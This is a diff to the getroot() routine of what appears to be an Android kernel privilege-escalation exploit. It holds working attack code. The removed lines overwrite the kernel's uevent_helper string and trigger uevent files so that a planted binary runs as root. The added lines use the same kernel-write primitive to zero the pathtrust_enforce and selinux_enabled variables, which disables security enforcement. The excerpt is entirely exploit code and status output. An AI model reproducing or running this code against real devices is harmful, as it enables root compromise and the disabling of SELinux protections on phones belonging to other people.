@@ -289,37 +289,32 @@ int getroot(struct offsets* o)
 	 * sys_call_table lives in read-only .text. Pivot instead on a writable
 	 * .data string: overwrite uevent_helper with a path the kernel will
 	 * call_usermodehelper() as root. */
-	const char* helper = "/data/local/tmp/rh";
+	const char* helper = "";
 	size_t len = strlen(helper) + 1;
 	unsigned int i;
 
-	if(!o->uevent_helper)
-		return 1;
-
-	printf("[+] Writing uevent_helper @ %p = %s\n", o->uevent_helper, helper);
-	for(i = 0; i < len; i += 4)
-	{
-		unsigned long chunk = 0;
-		size_t n = len - i;
-		if(n > 4) n = 4;
-		memcpy(&chunk, helper + i, n);
-		if(write_at_address((char*)o->uevent_helper + i, chunk))
+	if(o->pathtrust_enforce) {
+		printf("[+] pathtrust_enforce @ %p <- 0\n", o->pathtrust_enforce);
+		if(write_at_address(o->pathtrust_enforce, 0))
+			return 1;
+	}
+	if(o->selinux_enabled) {
+		printf("[+] selinux_enabled @ %p <- 0\n", o->selinux_enabled);
+		if(write_at_address(o->selinux_enabled, 0))
 			return 1;
 	}
 
-	/* nudge the kernel to invoke the helper we just installed */
-	{
-		const char* ue[] = {
-			"/sys/class/leds/lcd-backlight/uevent",
-			"/sys/class/net/lo/uevent",
-			"/sys/class/android_usb/android0/uevent",
-			"/sys/devices/virtual/misc/uevent_helper_probe/uevent",
-			NULL };
-		int k;
-		for(k = 0; ue[k]; k++)
+	/* optional: uevent_helper pivot (disabled by default) */
+	if(o->uevent_helper && strlen(helper) > 1 && helper[0] == '/') {
+		printf("[+] Writing uevent_helper @ %p = %s\n", o->uevent_helper, helper);
+		for(i = 0; i < len; i += 4)
 		{
-			int fd = open(ue[k], O_WRONLY);
-			if(fd >= 0) { write(fd, "add", 3); close(fd); printf("[+] triggered %s\n", ue[k]); }
+			unsigned long chunk = 0;
+			size_t n = len - i;
+			if(n > 4) n = 4;
+			memcpy(&chunk, helper + i, n);
+			if(write_at_address((char*)o->uevent_helper + i, chunk))
+				return 1;
 		}
 	}
 
